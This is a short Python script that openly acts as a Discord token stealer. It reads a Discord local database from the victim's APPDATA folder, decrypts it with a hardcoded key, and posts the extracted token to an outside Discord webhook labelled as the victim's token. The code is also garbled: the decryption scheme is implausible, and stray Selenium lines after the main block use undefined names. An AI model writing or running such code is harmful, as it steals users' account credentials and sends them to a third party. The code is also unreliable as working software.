import discord
import os
from Crypto.Cipher import AES

def main():
    local_db_path = os.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb.mainnet.db"

    with open(local_db_path, "rb") as f:
        db = f.read()

    key = b"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
    cipher = AES.new(key, AES.MODE_ECB)
    decrypted_db = cipher.decrypt(db)

    for i in range(len(decrypted_db) - len(key)):
        if decrypted_db[i:i+len(key)] == key:
            token_start = i + len(key)
            break

    token = decrypted_db[token_start:].split(b".")[0]
    print(token.decode("utf-8"))

    with open("token.txt", "w") as f:
        f.write(token.decode("utf-8"))

    webhook = discord.Webhook.from_url("https://discordapp.com/api/webhooks/746982871847898112/Jnv21gESlzxKh1iODJZOI6FTqa4tYScpXghXXmOJHcjIqxVcN3v7mwRNZXXeEclXJc robber", adapter=discord.RequestsWebhookAdapter())
    webhook.send(" Victim's discord token: {}".format(token.decode("utf-8")))

if __name__ == "__main__":
    main()

    elem = driver.find_element_by_css_selector("body")

    driver.get("https://web.telegram.org/#/im?p=@yourbot")
    time.sleep(5)
    driver.close()
